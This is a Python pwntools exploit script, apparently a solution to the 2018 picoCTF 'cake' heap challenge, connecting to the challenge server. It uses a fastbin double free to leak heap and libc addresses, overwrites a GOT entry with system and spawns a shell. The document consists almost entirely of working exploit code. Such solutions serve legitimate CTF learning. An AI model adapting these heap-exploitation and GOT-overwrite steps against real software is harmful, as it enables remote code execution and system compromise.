from pwn import *
import re,sys

def make(name, price):
    r.sendlineafter("> ", "M")
    r.sendlineafter("Name> ", name)
    r.sendlineafter("Price> ", str(price))

def wait_c():
    r.sendlineafter("> ", "W")

def serve(index):
    r.sendlineafter("> ", "S")
    r.sendlineafter("> ", str(index))

def inspect(index):
    r.sendlineafter("> ", "I")
    r.sendlineafter("> ", str(index))

libc = ELF('./libc.so.6')
#r = process(['./ubuntu-xenial-amd64-libc6-ld-2.23.so', './cake'], env={"LD_PRELOAD":"./libc.so.6"})
r = remote("2018shell1.picoctf.com", 42542)

#################
make("daaa", 0x656565)
make("eaaa", 0x656565)
make("AAAA"*10, 10)
make("BBBB"*10, 10)
#gdb.attach(r)
serve(0)
serve(1)
serve(0)

#################
#leak heap
inspect(0)
r.recvuntil("for $")
heap_addr = int(r.recvline().strip(), 10)
log.info("heap: 0x{:x}".format(heap_addr))

#############
#wait for customers to be 0x21
while True:
    rd = r.recvuntil("waiting.")
    got = re.findall(ur'and have (.+?) customers waiting', rd)[0]
    if int(got) < 0x21:
        log.info(got)
        wait_c()
        #r.interactive()
    elif int(got) == 0x21:
        break
    else:
        sys.exit()

#############
make("aaaa", 0x6030E0) #customer number -0x8
#gdb.attach(r)
make("bbbb", u64('/bin/sh\x00'))
make("aaaa", 0x31313131)
make(p64(0x21), 0x603088)
inspect(0)
libc_base = u64(r.recv(6) + "\x00"*2) - 0x3af60
log.info("libc base: 0x{:x}".format(libc_base))

#############
#gdb.attach(r)
serve(3)
serve(4)
serve(3)

make("aaaa", 0x6030f0) #customer number -0x8
make("bbbb", 0x6030f8)
make("aaaa", 0x31313131)
#gdb.attach(r)
make(p64(0x6030f0), 0x21)

#############
serve(9)
serve(10)
serve(9)
serve(10)

make("aaaa", 0x6030f8) #customer number -0x8
make("bbbb", 0x6030f0)
make("aaaa", 0x31313131)
make(p64(0x0), 0x0)
system_addr = libc_base + libc.symbols['system']
#gdb.attach(r)
make(p64(0x603018), system_addr)
###################

r.interactive()
# serve 5th cake now
